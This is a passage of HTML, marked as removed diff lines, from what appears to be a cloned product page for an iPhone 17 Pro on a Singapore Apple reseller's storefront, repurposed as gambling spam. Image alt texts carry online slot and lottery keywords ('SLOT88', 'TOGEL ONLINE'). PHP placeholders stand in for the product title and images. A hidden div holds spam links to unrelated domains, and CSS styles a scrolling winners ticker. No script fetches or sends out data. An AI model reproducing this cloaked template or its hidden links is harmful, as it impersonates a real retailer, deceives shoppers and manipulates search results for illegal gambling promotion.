-                                      <path d="M13.0793 6.04286C11.9282 6.04286 10.9917 5.10627 10.9917 3.95529V2.43102H11.7254V3.95529C11.7254 4.70173 12.3327 5.30906 13.0793 5.30906C13.8258 5.30906 14.4333 4.70173 14.4333 3.95529V2.54174L13.231 0.73392H2.60295L1.40068 2.54163V3.95517C1.40068 4.70162 2.00812 5.30894 2.75468 5.30894C3.50124 5.30894 4.10856 4.70162 4.10856 3.95517V2.43091H4.84225V3.95517C4.84225 5.10627 3.90578 6.04275 2.75468 6.04275C1.60347 6.04275 0.666992 5.10616 0.666992 3.95517V2.43091C0.666992 2.35862 0.688332 2.2879 0.728328 2.22768L2.10075 0.16379C2.16868 0.0614505 2.28342 0 2.40621 0H13.4275C13.5503 0 13.6651 0.0614477 13.733 0.16379L15.1057 2.22779C15.1458 2.28802 15.167 2.35874 15.167 2.43102V3.95529C15.167 5.10627 14.2305 6.04286 13.0793 6.04286H13.0793Z" fill="#1D1D1F"/>
-                                      <path d="M1.0332 2.06055H14.7997V2.79435H1.0332V2.06055Z" fill="#1D1D1F"/>
-                                      <rect x="5.4806" y="8.38246" width="4.63549" height="4.63549" rx="0.534864" stroke="black" stroke-width="0.713153"/>
-                                  </svg>
-                                  <div class="pickup-availability-info">
-                                      <p class="caption-large">
-                                        <b>Pickup</b>
-                                      </p>
-                                      <div class="js-pickup-availability-info">
-                                        <p class="caption">
-                                            Loading store <i class="fa fa-spinner fa-spin"></i>
-                                        </p>
-                                      </div>
-                                  </div>
-                                </pickup-availability-preview>
-                                <template>
-                                  <p class="caption">
-                                      Error loading
-                                  </p>
-                                </template>
-                            </pickup-availability>
-                            <p class="free_shipping_msg_2" style="display:none;">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="12" viewBox="0 0 16 12" fill="none">
-                                  <path d="M1.89353 9.84661C1.43772 9.84661 1.09151 9.72831 0.854906 9.49171C0.618302 9.2551 0.5 8.9089 0.5 8.45308V1.7464C0.5 1.28711 0.618302 0.939166 0.854906 0.702562C1.09151 0.465958 1.43772 0.347656 1.89353 0.347656H9.40919C9.865 0.347656 10.2112 0.467698 10.4478 0.707782C10.6844 0.947865 10.8027 1.29407 10.8027 1.7464V9.02198L10.1608 9.39776V1.75684C10.1608 1.50284 10.0946 1.31321 9.96242 1.18795C9.8302 1.05921 9.64057 0.994838 9.39353 0.994838H1.90397C1.65344 0.994838 1.46381 1.05921 1.33507 1.18795C1.20633 1.31321 1.14196 1.50284 1.14196 1.75684V8.43743C1.14196 8.69143 1.20633 8.8828 1.33507 9.01154C1.46381 9.14028 1.65344 9.20465 1.90397 9.20465H2.89562V9.84661H1.89353ZM10.4322 3.88628V3.24432H12.2902C12.5303 3.24432 12.7356 3.27737 12.9061 3.34348C13.08 3.40959 13.2383 3.51919 13.381 3.67229L15.1555 5.67647C15.2843 5.8226 15.373 5.967 15.4217 6.10966C15.4739 6.25232 15.5 6.43499 15.5 6.65768V8.45308C15.5 8.9089 15.3817 9.2551 15.1451 9.49171C14.9085 9.72831 14.5623 9.84661 14.1065 9.84661H13.3601V9.20465H14.0908C14.3413 9.20465 14.531 9.14028 14.6597 9.01154C14.7919 8.8828 14.858 8.69143 14.858 8.43743V6.64202C14.858 6.54111 14.8389 6.44021 14.8006 6.33931C14.7624 6.23492 14.7067 6.14098 14.6336 6.05747L12.9426 4.1629C12.8452 4.05503 12.7408 3.98196 12.6294 3.94369C12.5181 3.90542 12.3876 3.88628 12.238 3.88628H10.4322ZM11.7422 6.64202C11.6239 6.64202 11.5282 6.60722 11.4551 6.53764C11.3855 6.46805 11.3507 6.3741 11.3507 6.2558V4.41864H12.1284C12.2189 4.41864 12.2989 4.43777 12.3685 4.47605C12.4381 4.51084 12.5007 4.55782 12.5564 4.61697L14.1117 6.3654C14.15 6.40716 14.1795 6.44891 14.2004 6.49066C14.2248 6.53242 14.237 6.58287 14.237 6.64202H11.7422ZM4.27349 11.3341C3.95338 11.3341 3.6611 11.2558 3.39666 11.0992C3.1357 10.9426 2.92693 10.7321 2.77035 10.4677C2.61378 10.2067 2.53549 9.9162 2.53549 9.59609C2.53549 9.27598 2.61378 8.98544 2.77035 8.72448C2.92693 8.46004 3.1357 8.25128 3.39666 8.09818C3.6611 7.9416 3.95338 7.86331 4.27349 7.86331C4.5936 7.86331 4.88413 7.9416 5.14509 8.09818C5.40605 8.25128 5.61482 8.46004 5.7714 8.72448C5.92798 8.98544 6.00626 9.27598 6.00626 9.59609C6.00626 9.9162 5.92798 10.2067 5.7714 10.4677C5.61482 10.7321 5.40605 10.9426 5.14509 11.0992C4.88413 11.2558 4.5936 11.3341 4.27349 11.3341ZM4.27349 10.7756C4.48921 10.7756 4.6858 10.7217 4.86326 10.6138C5.04419 10.5095 5.18685 10.3668 5.29123 10.1859C5.39562 10.0084 5.44781 9.81182 5.44781 9.59609C5.44781 9.37688 5.39562 9.17855 5.29123 9.0011C5.18685 8.82365 5.04419 8.68273 4.86326 8.57835C4.6858 8.47048 4.48921 8.41655 4.27349 8.41655C4.05428 8.41655 3.85595 8.47048 3.6785 8.57835C3.50104 8.68273 3.35839 8.82365 3.25052 9.0011C3.14266 9.17855 3.08873 9.37688 3.08873 9.59609C3.08873 9.81182 3.14266 10.0084 3.25052 10.1859C3.35839 10.3668 3.50104 10.5095 3.6785 10.6138C3.85595 10.7217 4.05428 10.7756 4.27349 10.7756ZM11.8622 11.3341C11.5456 11.3341 11.255 11.2558 10.9906 11.0992C10.7262 10.9426 10.5157 10.7321 10.3591 10.4677C10.2025 10.2067 10.1242 9.9162 10.1242 9.59609C10.1242 9.27598 10.2025 8.98544 10.3591 8.72448C10.5157 8.46004 10.7262 8.25128 10.9906 8.09818C11.255 7.9416 11.5456 7.86331 11.8622 7.86331C12.1823 7.86331 12.4729 7.9416 12.7338 8.09818C12.9983 8.25128 13.207 8.46004 13.3601 8.72448C13.5167 8.98544 13.595 9.27598 13.595 9.59609C13.595 9.9162 13.5167 10.2067 13.3601 10.4677C13.207 10.7321 12.9983 10.9426 12.7338 11.0992C12.4729 11.2558 12.1823 11.3341 11.8622 11.3341ZM11.8622 10.7756C12.0814 10.7756 12.2797 10.7217 12.4572 10.6138C12.6347 10.5095 12.7756 10.3668 12.88 10.1859C12.9843 10.0084 13.0365 9.81182 13.0365 9.59609C13.0365 9.37688 12.9826 9.17855 12.8747 9.0011C12.7704 8.82365 12.6294 8.68273 12.452 8.57835C12.2745 8.47048 12.0779 8.41655 11.8622 8.41655C11.6465 8.41655 11.4499 8.47048 11.2724 8.57835C11.095 8.68273 10.9523 8.82365 10.8445 9.0011C10.7366 9.17855 10.6827 9.37688 10.6827 9.59609C10.6827 9.81182 10.7366 10.0084 10.8445 10.1859C10.9523 10.3668 11.095 10.5095 11.2724 10.6138C11.4499 10.7217 11.6465 10.7756 11.8622 10.7756ZM5.70355 9.84661V9.20465H10.4896V9.84661H5.70355Z" fill="black"/>
-                                </svg>
-                                <span>
-                                <b>Shipping</b><br>
-                                Typically ships in 1-3 days.
-                                </span>
-                            </p>
-                          </div>
-                          
-                          <div class="g-atc"></div>
-                          <div >
-                            <product-form
-                                class="product-form"
-                                data-hide-errors="false"
-                                data-section-id="template--17605519376564__main"
-                                >
-                                <div class="product-form__error-message-wrapper" role="alert" hidden>
-                                  <svg
-                                      aria-hidden="true"
-                                      focusable="false"
-                                      class="icon icon-error"
-                                      viewBox="0 0 13 13"
-                                      >
-                                      <circle cx="6.5" cy="6.50049" r="5.5" stroke="white" stroke-width="2"/>
-                                      <circle cx="6.5" cy="6.5" r="5.5" fill="#EB001B" stroke="#EB001B" stroke-width="0.7"/>
-                                      <path d="M5.87413 3.52832L5.97439 7.57216H7.02713L7.12739 3.52832H5.87413ZM6.50076 9.66091C6.88091 9.66091 7.18169 9.37267 7.18169 9.00504C7.18169 8.63742 6.88091 8.34917 6.50076 8.34917C6.12061 8.34917 5.81982 8.63742 5.81982 9.00504C5.81982 9.37267 6.12061 9.66091 6.50076 9.66091Z" fill="white"/>
-                                      <path d="M5.87413 3.17832H5.51535L5.52424 3.537L5.6245 7.58083L5.63296 7.92216H5.97439H7.02713H7.36856L7.37702 7.58083L7.47728 3.537L7.48617 3.17832H7.12739H5.87413ZM6.50076 10.0109C7.06121 10.0109 7.5317 9.57872 7.5317 9.00504C7.5317 8.43137 7.06121 7.99918 6.50076 7.99918C5.94031 7.99918 5.46982 8.43137 5.46982 9.00504C5.46982 9.57872 5.94031 10.0109 6.50076 10.0109Z" fill="white" stroke="#EB001B" stroke-width="0.7">
-                                  </svg>
-                                  <span class="product-form__error-message"></span>
-                                </div>
-                                <div class="mpn_handle_GA" hidden>
-                                  <input
-                                      id="compr_price_44033871610036"
-                                      type="hidden"
-                                      value=""
-                                      >
-                                  <input
-                                      id="mpn_handle_44033871610036"
-                                      type="hidden"
-                                      value="9484875120"
-                                      >
-                                  <input
-                                      id="total_qty_"
-                                      type="hidden"
-                                      value=""
-                                      >
-                                  <input
-                                      id="prod_price_44033871610036"
-                                      type="hidden"
-                                      value="259.00"
-                                      >
-                                </div>
-                                <form method="post" action="/cart/add" id="product-form-template--17605519376564__main" accept-charset="UTF-8" class="form" enctype="multipart/form-data" novalidate="novalidate" data-type="add-to-cart-form">
-                                  <input type="hidden" name="form_type" value="product" /><input type="hidden" name="utf8" value="✓" /><input
-                                      type="hidden"
-                                      id="main-product-variant"
-                                      name="id"
-                                      value="44033871610036"
-                                      disabled
-                                      class="product-variant-id"
-                                      >
-                                  <input
-                                      id="mpn_handle"
-                                      type="hidden"
-                                      name="properties[_uuid]"
-                                      value="9484875120"
-                                      >
-                                  <input id="main-pro-sku" type="hidden" value="9484875120">
-                                  <input id="main-pro-handle" type="hidden" value="iphone-17-pro-mg8h4x-a">
-                                  <input type="hidden" id="tax_tags" value="a_iphone17pro">
-                                  <input
-                                      type="hidden"
-                                      id="product_max_quantity"
-                                      value="/"
-                                      ><input
-                                      type="hidden"
-                                      id="productInventoryQuantity"
-                                      value="0"
-                                      >
-                                  <input type="hidden" id="product_id" value="7986665160884">
-                                  <input type="hidden" class="pdp_product_list" id="product_list" type="text" value="">
-                                  <input type="hidden" class="pdp_product_category" type="text" value="iPhone">
-                                  <input type="hidden" class="pdp_product_currency" type="text" value="SGD">
-                                  <input type="hidden" class="pdp_product_price" id="product_price" type="text" value="">
-                                  <input type="hidden" class="pdp_product_title" value="<?= $title; ?>">
-                                  <div class="addtocartPDP product-form__buttons">
-                                      <button
-                                        id="addtocart-submit"
-                                        type="submit"
-                                        name="add"
-                                        class="addtocartPDP product-form__submit button button--full-width button--secondary"
-                                        disabled
-                                        >
-                                        <span>Out of Stock
-                                        </span>
-                                        <div class="loading-overlay__spinner hidden">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="spinner"
-                                              viewBox="0 0 66 66"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <circle class="path" fill="none" stroke-width="6" cx="33" cy="33" r="30"></circle>
-                                            </svg>
-                                        </div>
-                                      </button>
-                                      <button
-                                        type="submit"
-                                        onclick="addClass()"
-                                        data-submit="submit"
-                                        id="button-id-buy"
-                                        class="shopify-payment-button__button--unbranded shopify-payment-button__button"
-                                        >
-                                      Buy It Now
-                                      </button>
-                                      <script>
-                                        function addClass() {
-                                          var v = document.getElementById('button-id-buy');
-                                          v.className += ' BUY_NOW_CLICKED';
-                                        }
-                                      </script>
-                                  </div>
-                                  <input type="hidden" name="product-id" value="7986665160884" /><input type="hidden" name="section-id" value="template--17605519376564__main" />
-                                </form>
-                            </product-form>
-                          </div>
-  <style>
-    :root{
-      --win-bg:#050814;
-      --win-border:rgba(255,255,255,.12);
-      --win-text:#f6f7ff;
-      --win-muted:#a2a9cf;
-    }
-
-    .win-section{
-      max-width:900px;
-      margin:32px auto 40px;
-      padding:20px 18px 30px;
-      font-family:"Poppins",system-ui,-apple-system,BlinkMacSystemFont,sans-serif;
-      color:var(--win-text);
-      background:
-        radial-gradient(circle at top,rgba(91,219,255,.12),transparent 60%),
-        radial-gradient(circle at bottom,rgba(255,73,175,.12),transparent 55%);
-    }
-
-    .win-title{
-      text-align:center;
-      text-transform:uppercase;
-      letter-spacing:.08em;
-      margin-bottom:6px;
-      font-size:1.2rem;
-      background:linear-gradient(120deg,#ffffff,#4df5ff,#ff6ad5);
-      -webkit-background-clip:text;
-      color:transparent;
-    }
-
-    .win-subtitle{
-      text-align:center;
-      font-size:.82rem;
-      color:var(--win-muted);
-      margin-bottom:18px;
-    }
-
-    .win-ticker-frame{
-      border-radius:20px;
-      padding:2px;
-      background:
-        linear-gradient(130deg,rgba(77,245,255,.7),rgba(160,99,255,.7),rgba(255,106,213,.7));
-      box-shadow:
-        0 0 30px rgba(0,0,0,.9),
-        0 0 28px rgba(120,80,255,.4);
-    }
-
-    .win-ticker-window{
-      position:relative;
-      overflow:hidden;
-      border-radius:18px;
-      background:radial-gradient(circle at top left,#171c3a,#050814 55%);
-      max-height:230px; /* tinggi tampilan jendela */
-    }
-
-    .win-ticker-track{
-      display:flex;
-      flex-direction:column;
-      padding:8px 10px 12px;
-      animation:scrollWinner 18s linear infinite;
-    }
-
-    .win-ticker-window:hover .win-ticker-track{
-      animation-play-state:paused; /* pause saat hover */
-    }
-
-    .win-item{
-      display:flex;
-      align-items:center;
-      gap:8px;
-      padding:7px 10px;
-      margin:2px 0;
-      border-radius:14px;
-      background:linear-gradient(135deg,rgba(15,23,42,.92),rgba(17,24,56,.96));
-      box-shadow:
-        0 14px 32px rgba(0,0,0,.85),
-        inset 0 0 0 1px rgba(255,255,255,.02);
-      font-size:.82rem;
-      white-space:nowrap;
-    }
-
-    .dot{
-      width:8px;
-      height:8px;
-      border-radius:999px;
-      background:radial-gradient(circle,#5be6ff 0%,#0aa5ff 45%,rgba(10,255,135,0) 80%);
-      box-shadow:0 0 14px rgba(0, 110, 255, 0.9);
-      flex-shrink:0;
-    }
-
-    .name{
-      font-weight:700;
-      color:#ffffff;
-      flex-shrink:0;
-    }
-
-    .text{
-      color:var(--win-muted);
-    }
-
-    .amount{
-      color:#5be6ff;
-      font-weight:700;
-    }
-
-    @keyframes scrollWinner{
-      0%{
-        transform:translateY(0);
-      }
-      100%{
-        transform:translateY(-50%); /* karena nanti di-duplicate jadi 2x panjang */
-      }
-    }
-
-    @media (max-width:600px){
-      .win-item{
-        font-size:.78rem;
-      }
-    }
-  </style>
-
-  <script>
-    document.addEventListener("DOMContentLoaded", function () {
-      const track = document.getElementById("winTickerTrack");
-      if (!track) return;
-      const clone = track.cloneNode(true);
-      while (clone.firstChild) {
-        track.appendChild(clone.firstChild);
-      }
-    });
-  </script>
-
-
-
-
-                            <svg
-                                viewBox="0 0 14 10"
-                                fill="none"
-                                aria-hidden="true"
-                                focusable="false"
-                                class="footer_mail_arrow icon icon-arrow"
-                                xmlns="http://www.w3.org/2000/svg"
-                                >
-                            </svg>
-                          </a>
-                      </product-info>
-                    </div>
-                    <div style="display: none;"><a href="//photoprime.org/">photoprime.org</a><a href="//ripcurl.blog/">ripcurl.blog</a></div>
-                </div>
-                <product-modal id="ProductModal-template--17605519376564__main" class="product-media-modal">
-                    <div
-                      class="product-media-modal__dialog"
-                      role="dialog"
-                      aria-label="Media gallery"
-                      aria-modal="true"
-                      tabindex="-1"
-                      >
-                      <button
-                          id="ModalClose-template--17605519376564__main"
-                          type="button"
-                          class="product-media-modal__toggle"
-                          aria-label="Close"
-                          >
-                          <svg
-                            xmlns="http://www.w3.org/2000/svg"
-                            aria-hidden="true"
-                            focusable="false"
-                            class="icon icon-close"
-                            fill="none"
-                            viewBox="0 0 18 17"
-                            width="18"
-                            height="17"
-                            >
-                            <path
-                                d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
-                                fill="currentColor"
-                                >
-                          </svg>
-                      </button>
-                      <div
-                          class="product-media-modal__content color-background-1 gradient"
-                          role="document"
-                          aria-label="Media gallery"
-                          tabindex="0"
-                          >
-                          <img
-                            class="custom_popup_compare_32122040123572 global-media-settings global-media-settings--no-shadow"
-                            srcset="<?= $image; ?>?v=1757450054&width=550 550w,<?= $image; ?>?v=1757450054&width=1100 1100w,<?= $image; ?>?v=1757450054&width=1445 1445w,<?= $image; ?>?v=1757450054&width=1680 1680w,<?= $image; ?>?v=1757450054&width=2048 2048w,<?= $image; ?>?v=1757450054&width=2200 2200w,<?= $image; ?>?v=1757450054&width=2890 2890w,<?= $image; ?>?v=1757450054 4000w"
-                            sizes="(min-width: 750px) calc(100vw - 22rem), 1100px"
-                            src="<?= $image; ?>?v=1757450054&width=1445"
-                            alt="<?= $title; ?>"
-                            loading="lazy"
-                            width="1100"
-                            height="1100"
-                            data-media-id="32122040123572"
-                            >
-                          <img
-                            class="custom_popup_compare_32122040156340 global-media-settings global-media-settings--no-shadow"
-                            srcset="<?= $image; ?>?v=1757450054&width=550 550w,<?= $image; ?>?v=1757450054&width=1100 1100w,<?= $image; ?>?v=1757450054&width=1445 1445w,<?= $image; ?>?v=1757450054&width=1680 1680w,<?= $image; ?>?v=1757450054&width=2048 2048w,<?= $image; ?>?v=1757450054&width=2200 2200w,<?= $image; ?>?v=1757450054&width=2890 2890w,<?= $image; ?>?v=1757450054 4000w"
-                            sizes="(min-width: 750px) calc(100vw - 22rem), 1100px"
-                            src="<?= $image; ?>?v=1757450054&width=1445"
-                            alt="iPhone_17_Pro_Cosmic_Orange_PDP_Image_Position_2_Cosmic_Orange_Colour__SG-EN"
-                            loading="lazy"
-                            width="1100"
-                            height="1100"
-                            data-media-id="32122040156340"
-                            >
-                          <img
-                            class="custom_popup_compare_32122040189108 global-media-settings global-media-settings--no-shadow"
-                            srcset="<?= $image; ?>?v=1757450055&width=550 550w,<?= $image; ?>?v=1757450055&width=1100 1100w,<?= $image; ?>?v=1757450055&width=1445 1445w,<?= $image; ?>?v=1757450055&width=1680 1680w,<?= $image; ?>?v=1757450055&width=2048 2048w,<?= $image; ?>?v=1757450055&width=2200 2200w,<?= $image; ?>?v=1757450055&width=2890 2890w,<?= $image; ?>?v=1757450055 4000w"
-                            sizes="(min-width: 750px) calc(100vw - 22rem), 1100px"
-                            src="<?= $image; ?>?v=1757450055&width=1445"
-                            alt="<?= $BRAND; ?>"
-                            loading="lazy"
-                            width="1100"
-                            height="1100"
-                            data-media-id="32122040189108"
-                            >
-                          <img
-                            class="custom_popup_compare_32122040221876 global-media-settings global-media-settings--no-shadow"
-                            srcset="<?= $image; ?>?v=1757450054&width=550 550w,<?= $image; ?>?v=1757450054&width=1100 1100w,<?= $image; ?>?v=1757450054&width=1445 1445w,<?= $image; ?>?v=1757450054&width=1680 1680w,<?= $image; ?>?v=1757450054&width=2048 2048w,<?= $image; ?>?v=1757450054&width=2200 2200w,<?= $image; ?>?v=1757450054&width=2890 2890w,<?= $image; ?>?v=1757450054 4000w"
-                            sizes="(min-width: 750px) calc(100vw - 22rem), 1100px"
-                            src="<?= $image; ?>?v=1757450054&width=1445"
-                            alt="SLOT88"
-                            loading="lazy"
-                            width="1100"
-                            height="1100"
-                            data-media-id="32122040221876"
-                            >
-                          <img
-                            class="custom_popup_compare_32122040254644 global-media-settings global-media-settings--no-shadow"
-                            srcset="<?= $image; ?>?v=1757450054&width=550 550w,<?= $image; ?>?v=1757450054&width=1100 1100w,<?= $image; ?>?v=1757450054&width=1445 1445w,<?= $image; ?>?v=1757450054&width=1680 1680w,<?= $image; ?>?v=1757450054&width=2048 2048w,<?= $image; ?>?v=1757450054&width=2200 2200w,<?= $image; ?>?v=1757450054&width=2890 2890w,<?= $image; ?>?v=1757450054 4000w"
-                            sizes="(min-width: 750px) calc(100vw - 22rem), 1100px"
-                            src="<?= $image; ?>?v=1757450054&width=1445"
-                            alt="TOGEL ONLINE"
-                            loading="lazy"
-                            width="1100"
-                            height="1100"
-                            data-media-id="32122040254644"
-                            >
-                          <img
-                            class="custom_popup_compare_32122040287412 global-media-settings global-media-settings--no-shadow"
-                            srcset="<?= $image; ?>?v=1757450054&width=550 550w,<?= $image; ?>?v=1757450054&width=1100 1100w,<?= $image; ?>?v=1757450054&width=1445 1445w,<?= $image; ?>?v=1757450054&width=1680 1680w,<?= $image; ?>?v=1757450054&width=2048 2048w,<?= $image; ?>?v=1757450054&width=2200 2200w,<?= $image; ?>?v=1757450054&width=2890 2890w,<?= $image; ?>?v=1757450054 4000w"
-                            sizes="(min-width: 750px) calc(100vw - 22rem), 1100px"
-                            src="<?= $image; ?>?v=1757450054&width=1445"
-                            alt="TOTO TOGEL"
-                            loading="lazy"
-                            width="1100"
-                            height="1100"
-                            data-media-id="32122040287412"
-                            >
-                          <img
-                            class="custom_popup_compare_32122040320180 global-media-settings global-media-settings--no-shadow"
-                            srcset="<?= $image; ?>?v=1757450054&width=550 550w,<?= $image; ?>?v=1757450054&width=1100 1100w,<?= $image; ?>?v=1757450054&width=1445 1445w,<?= $image; ?>?v=1757450054&width=1680 1680w,<?= $image; ?>?v=1757450054&width=2048 2048w,<?= $image; ?>?v=1757450054&width=2200 2200w,<?= $image; ?>?v=1757450054&width=2890 2890w,<?= $image; ?>?v=1757450054 4000w"
-                            sizes="(min-width: 750px) calc(100vw - 22rem), 1100px"
-                            src="<?= $image; ?>?v=1757450054&width=1445"
-                            alt="SLOT"
-                            loading="lazy"
-                            width="1100"
-                            height="1100"
-                            data-media-id="32122040320180"
-                            >
-                          <img
-                            class="custom_popup_compare_32122040352948 global-media-settings global-media-settings--no-shadow"
-                            srcset="<?= $image; ?>?v=1757450054&width=550 550w,<?= $image; ?>?v=1757450054&width=1100 1100w,<?= $image; ?>?v=1757450054&width=1445 1445w,<?= $image; ?>?v=1757450054&width=1680 1680w,<?= $image; ?>?v=1757450054&width=2048 2048w,<?= $image; ?>?v=1757450054&width=2200 2200w,<?= $image; ?>?v=1757450054&width=2890 2890w,<?= $image; ?>?v=1757450054 4000w"
-                            sizes="(min-width: 750px) calc(100vw - 22rem), 1100px"
-                            src="<?= $image; ?>?v=1757450054&width=1445"
-                            alt="TOGEL 4D"
-                            loading="lazy"
-                            width="1100"
-                            height="1100"
-                            data-media-id="32122040352948"
-                            >
-                          <img
-                            class="custom_popup_compare_32122040385716 global-media-settings global-media-settings--no-shadow"
-                            srcset="<?= $image; ?>?v=1757450054&width=550 550w,<?= $image; ?>?v=1757450054&width=1100 1100w,<?= $image; ?>?v=1757450054&width=1445 1445w,<?= $image; ?>?v=1757450054&width=1680 1680w,<?= $image; ?>?v=1757450054&width=2048 2048w,<?= $image; ?>?v=1757450054&width=2200 2200w,<?= $image; ?>?v=1757450054&width=2890 2890w,<?= $image; ?>?v=1757450054 4000w"
-                            sizes="(min-width: 750px) calc(100vw - 22rem), 1100px"
-                            src="<?= $image; ?>?v=1757450054&width=1445"
-                            alt="TOTO SLOT"
-                            loading="lazy"
-                            width="1100"
-                            height="1100"
-                            data-media-id="32122040385716"
-                            >
-                          <img
-                            class="custom_popup_compare_32122040418484 global-media-settings global-media-settings--no-shadow"
-                            srcset="<?= $image; ?>?v=1757450054&width=550 550w,<?= $image; ?>?v=1757450054&width=1100 1100w,<?= $image; ?>?v=1757450054&width=1445 1445w,<?= $image; ?>?v=1757450054&width=1680 1680w,<?= $image; ?>?v=1757450054&width=2048 2048w,<?= $image; ?>?v=1757450054&width=2200 2200w,<?= $image; ?>?v=1757450054&width=2890 2890w,<?= $image; ?>?v=1757450054 4000w"
-                            sizes="(min-width: 750px) calc(100vw - 22rem), 1100px"
-                            src="<?= $image; ?>?v=1757450054&width=1445"
-                            alt="SITUS TOGEL"
-                            loading="lazy"
-                            width="1100"
-                            height="1100"
-                            data-media-id="32122040418484"
-                            >
-                          <img
-                            class="custom_popup_compare_32127875580084 global-media-settings global-media-settings--no-shadow"
-                            srcset="<?= $image; ?>?v=1757491890&width=550 550w,<?= $image; ?>?v=1757491890&width=1100 1100w,<?= $image; ?>?v=1757491890&width=1445 1445w,<?= $image; ?>?v=1757491890&width=1680 1680w,<?= $image; ?>?v=1757491890&width=2048 2048w,<?= $image; ?>?v=1757491890&width=2200 2200w,<?= $image; ?>?v=1757491890&width=2890 2890w,<?= $image; ?>?v=1757491890 4000w"
-                            sizes="(min-width: 750px) calc(100vw - 22rem), 1100px"
-                            src="<?= $image; ?>?v=1757491890&width=1445"
-                            alt="<?= $title; ?>"
-                            loading="lazy"
-                            width="1100"
-                            height="1100"
-                            data-media-id="32127875580084"
-                            >
-                          <deferred-media class="deferred-media media global-media-settings global-media-settings--no-shadow" style="padding-top: min(calc(100vh - 12rem), 56.33802816901409%)" data-media-id="32153557532852">
-                            <video
-                                playsInline="1"
-                                poster="https://apollondestroyer.org/uplloner/uploads/file_6a540ff455d85.gif?v=1757995782&width=758"
-                                preload="metadata"
-                                src="https://apollondestroyer.org/uplloner/uploads/file_6a540ff455d85.gif?v=1757995782&width=758"
-                                controls="controls"
-                                muted="muted"
-                                ></video>
-                          </deferred-media>
-                      </div>
-                    </div>
-                </product-modal>
-                <modal-dialog id="PopupModal-popup_custom_pptnJ9" class="product-popup-modal" >
-                    <div role="dialog" aria-label="Explore deals" aria-modal="true" class="product-popup-modal__content" tabindex="-1">
-                      <button id="ModalClose-popup_custom_pptnJ9" type="button" class="product-popup-modal__toggle" aria-label="Close">
-                          <svg
-                            xmlns="http://www.w3.org/2000/svg"
-                            aria-hidden="true"
-                            focusable="false"
-                            class="icon icon-close"
-                            fill="none"
-                            viewBox="0 0 18 17"
-                            width="18"
-                            height="17"
-                            >
-                            <path
-                                d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
-                                fill="currentColor"
-                                >
-                          </svg>
-                      </button>
-                      <div class="product-popup-modal__content-info">
-                          <h1 class="h2">Limited Time Promotion</h1>
-                      </div>
-                    </div>
-                </modal-dialog>
-                <modal-dialog id="PopupModal-popup_custom_VYxbeD" class="product-popup-modal" >
-                    <div role="dialog" aria-label="Pelajari Selengkapnya" aria-modal="true" class="product-popup-modal__content" tabindex="-1">
-                      <button id="ModalClose-popup_custom_VYxbeD" type="button" class="product-popup-modal__toggle" aria-label="Close">
-                          <svg
-                            xmlns="http://www.w3.org/2000/svg"
-                            aria-hidden="true"
-                            focusable="false"
-                            class="icon icon-close"
-                            fill="none"
-                            viewBox="0 0 18 17"
-                            width="18"
-                            height="17"
-                            >
-                            <path
-                                d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
-                                fill="currentColor"
-                                >
-                          </svg>
-                      </button>
-                      <div class="product-popup-modal__content-info">
-                          <h1 class="h2">Financing</h1>
-                      </div>
-                    </div>
-                </modal-dialog>
-                <modal-dialog id="PopupModal-popup_custom_6mTgxV" class="product-popup-modal" >
-                    <div role="dialog" aria-label="Pelajari Selengkapnya" aria-modal="true" class="product-popup-modal__content" tabindex="-1">
-                      <button id="ModalClose-popup_custom_6mTgxV" type="button" class="product-popup-modal__toggle" aria-label="Close">
-                          <svg
-                            xmlns="http://www.w3.org/2000/svg"
-                            aria-hidden="true"
-                            focusable="false"
-                            class="icon icon-close"
-                            fill="none"
-                            viewBox="0 0 18 17"
-                            width="18"
-                            height="17"
-                            >
-                            <path
-                                d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
-                                fill="currentColor"
-                                >
-                          </svg>
-                      </button>
-                      <div class="product-popup-modal__content-info">
-                          <h1 class="h2">Trade in popup</h1>
-                          <img src="https://cdn.shopify.com/s/files/1/0637/3864/2612/files/Trade-in_banner_desktop_48d9e5bb-febb-4bc9-9b4c-1a2d1aa42c69.png?v=1726197781" class="image desktop"> <img src="https://cdn.shopify.com/s/files/1/0637/3864/2612/files/Trade-in_banner_mobile_b9fb8bfe-8e63-4077-939f-38dec43b59e1.png?v=1726197781" class="image mobile">
-                          <main id="MainContent" class="content-for-layout focus-none" role="main" tabindex="-1">
-                            <h1 class="visually-hidden">
-                                Trade-In
-                            </h1>
-                            <section id="shopify-section-template--16932308091060__rich_text_i9f7na" class="shopify-section section">
-                                <link href="https://www.istudiosg.com/cdn/shop/t/8/assets/section-rich-text.css?v=165487089223517640671717736427" rel="stylesheet" type="text/css" media="all">
-                                <style data-shopify="">.section-template--16932308091060__rich_text_i9f7na-padding {
-                                  padding-top: 9px;
-                                  padding-bottom: 0px;
-                                  }
-                                  @media screen and (min-width: 750px) {
-                                  .section-template--16932308091060__rich_text_i9f7na-padding {
-                                  padding-top: 12px;
-                                  padding-bottom: 0px;
-                                  }
-                                  }
-                  .page-width.productcomparediv {
-                    background : #71deff;
-                  }
-                  .td1, .td2, .ac-modal-trigger.MoreInfoLink {
-                    color: #fff;
-                  }
-                                </style>
-                                <div class="isolate">
-                                  <div class="rich-text content-container color-background-1 gradient rich-text--full-width content-container--full-width section-template--16932308091060__rich_text_i9f7na-padding">
-                                      <div class="rich-text__wrapper rich-text__wrapper--center page-width">
-                                        <div class="rich-text__blocks center">
